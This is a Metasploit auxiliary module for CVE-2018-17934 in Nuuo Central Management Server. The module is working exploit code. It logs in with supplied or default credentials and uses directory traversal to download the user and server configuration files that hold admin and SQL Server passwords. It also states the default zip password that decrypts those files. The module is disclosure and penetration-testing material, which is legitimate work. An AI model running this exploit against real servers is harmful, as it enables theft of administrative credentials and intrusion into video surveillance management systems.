##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Nuuo
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Nuuo Central Management Server Authenticated Arbitrary File Download',
      'Description'    => %q{
      The Nuuo Central Management Server allows an authenticated user to download files from the
      installation folder. This functionality can be abused to obtain administrative credentials,
      the SQL Server database password and arbitrary files off the system with directory traversal.
      The module will attempt to download CMServer.cfg (the user configuration file with all the user
      passwords including the admin one), ServerConfig.cfg (the server configuration file with the
      SQL Server password) and a third file if the FILE argument is provided by the user.
      The two .cfg files are zip-encrypted files, but due to limitations of the Ruby ZIP modules
      included in Metasploit, these files cannot be decrypted programmatically. The user will
      have to open them with zip or a similar program and provide the default password "NUCMS2007!".
      This module will either use a provided session number (which can be guessed with an auxiliary
      module) or attempt to login using a provided username and password - it will also try the
      default credentials if nothing is provided.
      All versions of CMS server up to and including 3.5 are vulnerable to this attack.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-17934' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-cms-ownage.txt' ]

        ],
      'Platform'        => ['win'],
      'Privileged'      => true,
      'DisclosureDate'  => 'Oct 11 2018'))

    register_options(
      [
        OptInt.new('DEPTH', [true, 'Directory traversal depth [..\]', 2]),
        OptString.new('FILE', [false, 'Additional file to download'])
      ])
  end

  def download_file(file_name, ctype='application/zip', depth=2)
    res = ncs_send_request({
      'method'        => 'GETCONFIG',
      'user_session'  => user_session,
      'file_name'     => %{#{"..\\"*depth}#{file_name}}
    })

    return nil unless res
    path = store_loot(file_name, ctype, datastore['RHOST'],
                      res.body, file_name, "Nuuo CMS #{file_name} downloaded")
    print_good("Downloaded file to #{path}")
  end

  def run
    connect
    res = ncs_login

    unless res
      fail_with(Failure::NoAccess, "Failed to login to Nuuo CMS")
    end

    download_file('CMServer.cfg')
    download_file('ServerConfig.cfg')

    info = %q{
    The user and server configuration files were stored in the loot database.
    The files are ZIP encrypted, and due to the lack of the archive/zip gem,
    they cannot be decrypted in Metasploit.
    You will need to open them up with zip or a similar utility, and use the
    password NUCMS2007! to unzip them.
    Annoy the Metasploit developers until this gets fixed!
    }
    print_status("\r\n#{info}")

    if datastore['FILE']
      download_file(datastore['FILE'], 'application/octet-stream', datastore['DEPTH'])
    end

    client.close
  end
end
